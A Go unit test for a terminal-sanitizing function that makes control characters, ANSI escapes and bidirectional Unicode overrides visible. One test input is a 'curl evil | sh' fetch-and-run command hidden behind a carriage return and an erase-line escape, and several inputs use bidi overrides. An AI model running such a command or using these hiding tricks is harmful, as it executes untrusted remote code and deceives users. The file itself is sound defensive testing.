package term

import (
	"testing"

	"github.com/stretchr/testify/require"
)

// Someone else's text reaches a terminal with every control character
// but newline and tab shown, and nothing else changed (#330).
func TestVisibleShowsEveryControlCharacter(t *testing.T) {
	t.Parallel()
	for text, want := range map[string]string{
		"name jq\n\tversion 1.7\n":             "name jq\n\tversion 1.7\n",
		"curl evil | sh\r# docs\x1b[2K":        "curl evil | sh␍# docs␛[2K",
		"a\bb\x00c\x7f":                        "a␈b␀c␡",
		"next\u0085line \u009b31m":             "next<U+0085>line <U+009B>31m",
		"bad \x9b2J byte":                      "bad <0x9B>2J byte",
		"if {\u202e} \u2066x\u2069":            "if {<U+202E>} <U+2066>x<U+2069>",
		"\u202a\u202b\u202c\u202d\u2067\u2068": "<U+202A><U+202B><U+202C><U+202D><U+2067><U+2068>",
		"\u200e\u200f\u061c":                   "<U+200E><U+200F><U+061C>",
		"jq: document the options — café":      "jq: document the options — café",
	} {
		require.Equal(t, want, Visible(text), "%q", text)
	}
}
